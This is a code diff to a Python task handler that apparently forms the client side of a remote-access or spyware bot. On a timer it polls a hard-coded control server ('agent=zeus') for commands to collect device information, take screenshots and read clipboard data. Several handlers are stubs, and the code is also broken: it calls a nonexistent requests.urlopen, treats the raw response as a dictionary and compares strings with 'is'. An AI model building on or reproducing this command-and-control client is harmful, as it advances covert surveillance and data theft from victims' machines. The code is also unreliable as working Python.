@@ -29,25 +29,26 @@ class TaskManagmentHandler():
         taskResponse = requests.urlopen("http://192.168.0.102/control.php?task=getTask&agent=zeus&deviceID=xxxx").read()
 
         if taskResponse["task"]:
-            if taskResponse["task"] is "deviceInfo":
-                # Get device info
-                pass
-            elif taskResponse["task"] is "screenshot":
-                # Take screenshot
-                pass
-            elif taskResponse["task"] is "clipboard":
-                # Get clipboard data
-                devInfoProvider = DeviceInfoProvider()
-                clipboardData = devInfoProvider.getClipboardData()
+            if len(taskResponse["task"]) > 0:
+                self.currentAwaitingTime = self.MINUTES_TO_NORMAL_TASK
 
-
-        self.currentAwaitingTime = self.MINUTES_TO_NORMAL_TASK
+                if taskResponse["task"] is "deviceInfo":
+                    # Get device info
+                    devInfoProvider = DeviceInfoProvider()
+                    deviceInfoDict = devInfoProvider.getDeviceInfo()
+                    pass
+                elif taskResponse["task"] is "screenshot":
+                    # Take screenshot
+                    pass
+                elif taskResponse["task"] is "clipboard":
+                    # Get clipboard data
+                    devInfoProvider = DeviceInfoProvider()
+                    clipboardData = devInfoProvider.getClipboardData()
+        else:
+            self.currentAwaitingTime = self.MINUTES_TO_FAILED_TASK
 
         taskThread = threading.Timer(self.currentAwaitingTime, self.executeTaskFromServer)
         taskThread.start()
-
-    # start normal task after 5 minutes
-    # start cycled task every 20 minutes (task call itself after 20 minutes)
 
 
 if __name__ == "__main__":
